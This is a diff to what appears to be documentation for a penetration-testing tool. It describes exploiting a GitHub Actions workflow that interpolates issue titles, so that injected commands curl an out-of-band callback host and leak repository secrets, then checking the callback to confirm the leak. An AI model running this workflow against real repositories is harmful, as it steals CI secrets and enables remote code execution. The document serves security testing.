@@ -220,7 +220,12 @@ aith assess kali exec \
      --body "test"
 
 # Step 2: If workflow triggers on issues and interpolates title -> secrets exfiltrated
-# Check OOB callback hit with: aith oob client logs <name> --lines 80
+#   First mint a nonce-tagged callback host and embed its http host in the payload above:
+#     aith oob mint --technique CMDI --target-url https://github.com/TARGET/REPO --probe-kind exploit
+#     # -> http  http://<nonce>.researcher.example/   (curl that host in the injected step)
+#   Then correlate the exfil callback to this probe:
+#     aith oob poll --client <name>   # matched probe<->callback pair = secrets reached your host
+#   (aith oob client logs <name> --lines 80 is a raw listener tail for infra debugging only, not correlation.)
 # CVSS: 9.3 Critical (RCE with repo secrets)
 ```
 
